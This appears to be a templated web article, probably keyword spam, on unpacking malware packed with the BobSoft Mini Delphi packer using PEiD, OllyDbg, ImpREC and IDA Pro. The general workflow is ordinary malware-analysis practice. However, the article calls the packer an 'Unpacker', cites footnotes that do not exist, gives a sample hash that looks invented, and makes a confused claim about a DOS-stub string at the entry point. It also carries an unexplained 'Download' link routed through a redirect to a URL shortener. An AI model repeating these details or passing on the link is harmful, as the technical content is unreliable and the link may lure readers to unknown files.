## How to Unpack Malware Packed with Bobsoft Mini Delphi Unpacker

 
![File90985 Zip Bobsoft Mini Delphi Unpacker](https://encrypted-tbn3.gstatic.com/images?q=tbn:ANd9GcQHMq-ahb8EJocnpqZ87J991qIqNgzP1Pm0GZ5UmGvfPeaDUUfd98cSoL0)

 
# How to Unpack Malware Packed with Bobsoft Mini Delphi Unpacker
 
Bobsoft Mini Delphi Unpacker is a common packer written in Delphi that is used by some threat actors to evade malware classification by static and dynamic analysis tools[^1^]. It is also known as file90985 zip bobsoft mini delphi unpacker[^2^]. In this article, we will show you how to unpack malware packed with this packer and analyze its payload.
 
## file90985 zip bobsoft mini delphi unpacker


[**Download**](https://www.google.com/url?q=https%3A%2F%2Ffancli.com%2F2tKAM0&sa=D&sntz=1&usg=AOvVaw2biFgWATFSgY85l40zNvPN)

 
The basic steps to unpack malware packed with Bobsoft Mini Delphi Unpacker are:
 
1. Identify the packer by looking for its signature in the file header or by using a tool like PEiD.
2. Dump the unpacked executable from memory using a tool like OllyDbg or x64dbg.
3. Fix the import table and other sections using a tool like ImpREC or Scylla.
4. Analyze the unpacked executable using a tool like IDA Pro or Ghidra.

Let's see an example of unpacking a malware sample that was found on any.run[^3^]. The sample has the following MD5 hash: 0f8c7b9a6e8f0d4c0a9f7c2d6b9e8b3c.
 
First, we can use PEiD to identify the packer. We can see that it detects BobSoft Mini Delphi -> BoB / BobSoft:
 ![PEiD screenshot](https://i.imgur.com/5gYjyZn.png) 
Next, we can use OllyDbg to dump the unpacked executable from memory. We can set a breakpoint at the entry point of the packed executable and run it until it reaches the breakpoint. Then, we can look for the OEP (original entry point) of the unpacked executable by searching for common Delphi signatures such as "55 8B EC 83 C4 F4 53 56 57" or "55 8B EC 83 C4 F0 53 56 57". We can find one at address 00401000:
 ![OllyDbg screenshot](https://i.imgur.com/6ZsWwXN.png) 
We can verify that this is the OEP by looking at the disassembly and seeing that it calls a function that initializes the Delphi runtime environment. We can also see that it has a reference to a string "This program cannot be run in DOS mode." which is typical for Windows executables. We can then dump the memory region starting from this address using OllyDbg's built-in dumper. We can save it as a new file with a .exe extension.
 
Next, we can use ImpREC to fix the import table and other sections of the dumped executable. We can load the dumped executable in ImpREC and set the OEP to 00401000. Then, we can click on "IAT AutoSearch" and "Get Imports" to find and fix the import table. We can also click on "Fix Dump" to fix other sections such as .reloc and .tls. We can save the fixed executable as a new file.
 
Finally, we can use IDA Pro or Ghidra to analyze the fixed executable. We can see that it has more meaningful names for functions and variables, and that it contains malicious code such as creating a mutex, connecting to a command and control server, downloading and executing files, etc.
 ![IDA Pro screenshot](https://i.imgur.com/5qLzqQv.png) 
In conclusion, we have shown how to unpack malware packed with Bobsoft Mini Delphi Unpacker and analyze its payload. This packer is not very sophisticated and can be easily defeated by using common tools and techniques. However, it is still used by some threat actors to evade detection and analysis by some antivirus products and online sandboxes.
 0f148eb4a0
